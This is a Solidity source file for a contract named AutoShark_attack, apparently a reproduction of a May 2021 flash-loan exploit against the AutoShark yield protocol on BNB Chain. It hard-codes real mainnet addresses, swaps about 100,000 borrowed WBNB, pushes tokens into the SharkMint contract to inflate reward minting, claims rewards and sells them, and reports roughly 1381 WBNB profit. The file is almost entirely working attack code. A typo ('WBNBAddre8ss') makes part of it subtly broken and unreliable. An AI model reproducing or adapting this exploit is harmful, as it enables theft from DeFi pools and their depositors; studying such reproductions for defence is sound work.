// SPDX-License-Identifier: AGPL-3.0-or-later

// The ABI encoder is necessary, but older Solidity versions should work
pragma solidity ^0.7.0;
pragma experimental ABIEncoderV2;

//Timestamp  	2021-05-24 21:41:49(UTC)
//Block number 	7698696
//Gas limit  	2491833
//Gas used  1283321
// tx: 0xfbe65ad3eed6b28d59bf6043debf1166d3420d214020ef54f12d2e0583a66f13



interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IWBNB is IBEP20 {
    function deposit() external payable;
    function withdraw(uint wad) external;
}


interface IPantherRouter {
  function WETH (  ) external view returns ( address );
  function addLiquidity ( address tokenA, address tokenB, uint256 amountADesired, uint256 amountBDesired, uint256 amountAMin, uint256 amountBMin, address to, uint256 deadline ) external returns ( uint256 amountA, uint256 amountB, uint256 liquidity );
  function addLiquidityETH ( address token, uint256 amountTokenDesired, uint256 amountTokenMin, uint256 amountETHMin, address to, uint256 deadline ) external returns ( uint256 amountToken, uint256 amountETH, uint256 liquidity );
  function factory (  ) external view returns ( address );
  function getAmountIn ( uint256 amountOut, uint256 reserveIn, uint256 reserveOut ) external pure returns ( uint256 amountIn );
  function getAmountOut ( uint256 amountIn, uint256 reserveIn, uint256 reserveOut ) external pure returns ( uint256 amountOut );
  function getAmountsIn ( uint256 amountOut, address[] calldata path ) external view returns ( uint256[] memory amounts ); 
  function getAmountsOut ( uint256 amountIn, address[] calldata path ) external view returns ( uint256[] memory amounts );
  function quote ( uint256 amountA, uint256 reserveA, uint256 reserveB ) external pure returns ( uint256 amountB );
  function removeLiquidity ( address tokenA, address tokenB, uint256 liquidity, uint256 amountAMin, uint256 amountBMin, address to, uint256 deadline ) external returns ( uint256 amountA, uint256 amountB );
  function removeLiquidityETH ( address token, uint256 liquidity, uint256 amountTokenMin, uint256 amountETHMin, address to, uint256 deadline ) external returns ( uint256 amountToken, uint256 amountETH );
  function removeLiquidityETHSupportingFeeOnTransferTokens ( address token, uint256 liquidity, uint256 amountTokenMin, uint256 amountETHMin, address to, uint256 deadline ) external returns ( uint256 amountETH );
  function removeLiquidityETHWithPermit ( address token, uint256 liquidity, uint256 amountTokenMin, uint256 amountETHMin, address to, uint256 deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s ) external returns ( uint256 amountToken, uint256 amountETH );
  function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens ( address token, uint256 liquidity, uint256 amountTokenMin, uint256 amountETHMin, address to, uint256 deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s ) external returns ( uint256 amountETH );
  function removeLiquidityWithPermit ( address tokenA, address tokenB, uint256 liquidity, uint256 amountAMin, uint256 amountBMin, address to, uint256 deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s ) external returns ( uint256 amountA, uint256 amountB );
  function swapETHForExactTokens ( uint256 amountOut, address[] calldata path, address to, uint256 deadline ) external returns ( uint256[] memory amounts );
  function swapExactETHForTokens ( uint256 amountOutMin, address[] calldata path, address to, uint256 deadline ) external returns ( uint256[] memory amounts );
  function swapExactETHForTokensSupportingFeeOnTransferTokens ( uint256 amountOutMin, address[] calldata path, address to, uint256 deadline ) external;
  function swapExactTokensForETH ( uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline ) external returns ( uint256[] memory amounts );
  function swapExactTokensForETHSupportingFeeOnTransferTokens ( uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline ) external;
  function swapExactTokensForTokens ( uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline ) external returns ( uint256[] memory amounts );
  function swapExactTokensForTokensSupportingFeeOnTransferTokens ( uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline ) external;
  function swapTokensForExactETH ( uint256 amountOut, uint256 amountInMax, address[] calldata path, address to, uint256 deadline ) external returns ( uint256[] memory amounts );
  function swapTokensForExactTokens ( uint256 amountOut, uint256 amountInMax, address[] calldata path, address to, uint256 deadline ) external returns ( uint256[] memory amounts );
}


interface ISharkMint {
  function FEE_MAX (  ) external view returns ( uint256 );
  function PERFORMANCE_FEE (  ) external view returns ( uint256 );
  function WITHDRAWAL_FEE (  ) external view returns ( uint256 );
  function WITHDRAWAL_FEE_FREE_PERIOD (  ) external view returns ( uint256 );
  function amountSharkToMint ( uint256 bnbProfit ) external view returns ( uint256 );
  function amountSharkToMintForSharkBNB ( uint256 amount, uint256 duration ) external view returns ( uint256 );
  function dev (  ) external view returns ( address );
  function generateFlipToken (  ) external returns ( uint256 liquidity );
  function helper (  ) external view returns ( address );
  function isMinter ( address account ) external view returns ( bool );
  function mint ( uint256 amount, address to ) external;
  function mintFor ( address flip, uint256 _withdrawalFee, uint256 _performanceFee, address to, uint256, uint256 boostRate ) external returns ( uint256 mintAmount );
  function mintForSharkBNB ( uint256 amount, uint256 duration, address to ) external returns ( uint256 mintAmount );
  function owner (  ) external view returns ( address );
  function performanceFee ( uint256 profit ) external view returns ( uint256 );
  function renounceOwnership (  ) external;
  function setHelper ( address _helper ) external;
  function setMinter ( address minter, bool canMint ) external;
  function setPerformanceFee ( uint256 _fee ) external;
  function setSharkPerProfitBNB ( uint256 _ratio ) external;
  function setSharkPerSharkBNBFlip ( uint256 _sharkPerSharkBNBFlip ) external;
  function setWithdrawalFee ( uint256 _fee ) external;
  function setWithdrawalFeeFreePeriod ( uint256 _period ) external;
  function sharkBNBFlipToken (  ) external view returns ( address );
  function sharkPerProfitBNB (  ) external view returns ( uint256 );
  function sharkPerSharkBNBFlip (  ) external view returns ( uint256 );
  function sharkPool (  ) external view returns ( address );
  function swapTokenAtApe ( address _from, uint256 _amount, address _to ) external;
  function tokenToSharkBNB ( address token, uint256 amount ) external returns ( uint256 flipAmount );
  function transferOwnership ( address newOwner ) external;
  function transferSharkOwner ( address _owner ) external;
  function withdrawalFee ( uint256 amount, uint256 depositedAt ) external view returns ( uint256 );
}

interface IStrategyCompoundFLIP {
  function MAXIMUM_REFERRAL_COMMISSION_RATE (  ) external view returns ( uint16 );
  function adminGenerateFlipToken (  ) external returns ( uint256 liquidity );
  function adminHarvest (  ) external;
  function apy (  ) external view returns ( uint256 _usd, uint256 _shark, uint256 _bnb );
  function balance (  ) external view returns ( uint256 );
  function balanceOf ( address account ) external view returns ( uint256 );
  function boostRate (  ) external view returns ( uint256 );
  function deposit ( uint256 _amount, address _referrer ) external;
  function depositAll ( address _referrer ) external;
  function depositedAt ( address ) external view returns ( uint256 );
  function earned ( address account ) external view returns ( uint256 );
  function getReward (  ) external;
  function harvest (  ) external;
  function helper (  ) external view returns ( address );
  // function info ( address account ) external view returns ( tuple );
  function keeper (  ) external view returns ( address );
  function minter (  ) external view returns ( address );
  function owner (  ) external view returns ( address );
  function poolId (  ) external view returns ( uint256 );
  function priceShare (  ) external view returns ( uint256 );
  function principalOf ( address account ) external view returns ( uint256 );
  function profitOf ( address account ) external view returns ( uint256 _usd, uint256 _shark, uint256 _bnb );
  function referralCommissionRate (  ) external view returns ( uint16 );
  function renounceOwnership (  ) external;
  function rewardsToken (  ) external view returns ( address );
  function setBoostRate ( uint256 _boostRate ) external;
  function setFlipToken ( address _token ) external;
  function setHelper ( address _helper ) external;
  function setKeeper ( address _keeper ) external;
  function setMinter ( address _minter ) external;
  function setReferralCommissionRate ( uint16 _referralCommissionRate ) external;
  function setSharkReferral ( address _sharkReferral ) external;
  function sharesOf ( address account ) external view returns ( uint256 );
  function sharkChef (  ) external view returns ( address );
  function sharkReferral (  ) external view returns ( address );
  function stakingToken (  ) external view returns ( address );
  function token (  ) external view returns ( address );
  function totalShares (  ) external view returns ( uint256 );
  function totalSupply (  ) external view returns ( uint256 );
  function transferOwnership ( address newOwner ) external;
  function tvl (  ) external view returns ( uint256 );
  function withdraw ( uint256 ) external;
  function withdrawAll (  ) external;
  function withdrawableBalanceOf ( address account ) external view returns ( uint256 );
}


interface IPantherSwap {
  function DOMAIN_SEPARATOR (  ) external view returns ( bytes32 );
  function MINIMUM_LIQUIDITY (  ) external view returns ( uint256 );
  function PERMIT_TYPEHASH (  ) external view returns ( bytes32 );
  function allowance ( address, address ) external view returns ( uint256 );
  function approve ( address spender, uint256 value ) external returns ( bool );
  function balanceOf ( address ) external view returns ( uint256 );
  function burn ( address to ) external returns ( uint256 amount0, uint256 amount1 );
  function decimals (  ) external view returns ( uint8 );
  function factory (  ) external view returns ( address );
  function getReserves (  ) external view returns ( uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast );
  function initialize ( address _token0, address _token1 ) external;
  function kLast (  ) external view returns ( uint256 );
  function mint ( address to ) external returns ( uint256 liquidity );
  function name (  ) external view returns ( string memory );
  function nonces ( address ) external view returns ( uint256 );
  function permit ( address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s ) external;
  function price0CumulativeLast (  ) external view returns ( uint256 );
  function price1CumulativeLast (  ) external view returns ( uint256 );
  function skim ( address to ) external;
  function swap ( uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data ) external;
  function symbol (  ) external view returns ( string memory );
  function sync (  ) external;
  function token0 (  ) external view returns ( address );
  function token1 (  ) external view returns ( address );
  function totalSupply (  ) external view returns ( uint256 );
  function transfer ( address to, uint256 value ) external returns ( bool );
  function transferFrom ( address from, address to, uint256 value ) external returns ( bool );
}







contract AutoShark_attack {
    address private EOA;
    address private BUSDAddress = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address private PancakeRouterAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address private WBNBAddress = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address private PantherRouterAddress = 0x24f7C33ae5f77e2A9ECeed7EA858B4ca2fa1B7eC;
    address private SharkAddress = 0xf7321385a461C4490d5526D83E63c366b149cB15;
    address private SharkMintAddress = 0x37ee638d85e420532e35cD9dD831166514855e6D;
    address private PantherSwapWBNB2SHARKAddress = 0x1fd789Fa513871Cb89Aa655F11ec777cAD1784a0;
    address private StrategyCompoundFLIPAddress = 0xa007D347F2E55d731e101AaE64722C321b2B80dC;
    

    IBEP20 BUSD = IBEP20(BUSDAddress);
    IWBNB WBNB = IWBNB(WBNBAddress);
    IBEP20 SHARK = IBEP20(SharkAddress);
    IPantherRouter PancakeRouter = IPantherRouter(PantherRouterAddress);
    ISharkMint SharkMint = ISharkMint(SharkMintAddress);
    IStrategyCompoundFLIP StrategyCompoundFLIP= IStrategyCompoundFLIP(StrategyCompoundFLIPAddress);
    IPantherSwap PantherSwap = IPantherSwap(PantherSwapWBNB2SHARKAddress);
    IBEP20 LP = IBEP20(PantherSwapWBNB2SHARKAddress);


    string str1 = "";
    string str2 = "";
    string str3 = "";


    constructor() payable {
        require(msg.value == 100001 * 10 ** 18, "loan amount does not match");
        WBNB.deposit{value: 100001 * 10 ** 18}();

        WBNB.approve( PantherRouterAddress,  2 ** 256 - 1);
        SHARK.approve( PantherRouterAddress,  2 ** 256 - 1);
        LP.approve( StrategyCompoundFLIPAddress, 2 ** 256 - 1 );

        EOA = msg.sender;
    }

    receive() external payable {}


    // loan amount = 100000 WBNB
    function attack() public {

        // prepare:
        // Action 1: x WBNB -> LP    State: PancakeSwap
        //          State: PancakeSwap
        address[] memory ad = new address[](2);
        ad[0] = WBNBAddress;
        ad[1] = SharkAddress;
        PancakeRouter.swapExactTokensForTokens(5*10**17, 0, ad, address(this),  16218925690);
        // 391175802345833994977946  checked!
        uint balance = SHARK.balanceOf(address(this));
        SHARK.transfer(PantherSwapWBNB2SHARKAddress, balance);
        WBNB.transfer(PantherSwapWBNB2SHARKAddress, 5 * 10 ** 17);
        PantherSwap.mint(address(this));


        // Action: deposit   LP -> shares    State: StrategyCompoundFLIP
        //                   State: StrategyCompoundFLIP
        StrategyCompoundFLIP.deposit(LP.balanceOf(address(this)) / 2,  PantherRouterAddress);
        // 4073446756376372052


        // Action: still constraints
        // 30% of this LP transfer should be greater than 1000 
        LP.transfer(StrategyCompoundFLIPAddress, LP.balanceOf(address(this))); // Make Earned >= 0





        // flashloan starts:  

        // Action 2: x WBNB -> x/2 WBNB + x/2 SHARK          State: PancakeSwap
        //         
        ad = new address[](2);
        ad[0] = WBNBAddress;
        ad[1] = SharkAddress;
        PancakeRouter.swapExactTokensForTokens(50000*10**18, 0, ad, address(this),  16218925690);
        // 391175802345833994977946  checked!
        WBNB.transfer(SharkMintAddress, 50000*10**18);
        balance = SHARK.balanceOf(PantherSwapWBNB2SHARKAddress);
        // 10986943686428937612219 checked!
        SHARK.transfer(SharkMintAddress, balance);
        balance = SHARK.balanceOf(address(this));
        // 380188858659405057365727


        StrategyCompoundFLIP.getReward();




        // Action 3: PancakeSwap: Shark -> WBNB   State: PancakeSwap        
        //         State: PancakeSwap
        balance = SHARK.balanceOf(address(this));
        // 110380175226105425166568145

        ad[0] = SharkAddress;
        ad[1] = WBNBAddre8ss;
        PancakeRouter.swapExactTokensForTokens(balance, 0, ad, address(this), 16218925690);

        uint profit = WBNB.balanceOf(address(this));

        revert( ProfitSummary() ) ;
        // WBNB profit: 1381 578801613928548918 WBNB
    }

    function ProfitSummary() internal returns (string memory _uintAsString) {
        uint balance = WBNB.balanceOf(address(this));
        return append("WBNB profit: ", uint2str(balance - 100001 * 10 ** 18));
    }


    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len - 1;
        while (_i != 0) {
            bstr[k--] = byte(uint8(48 + _i % 10));
            _i /= 10;
        }
        return string(bstr);
    }

    function append(string memory a, string memory b) internal pure returns (string memory) {
        return string(abi.encodePacked(a, b));
    }

    function appendWithSpace(string memory a, string memory b) internal pure returns (string memory) {
        return append(a, append(" ", b));
    }     

}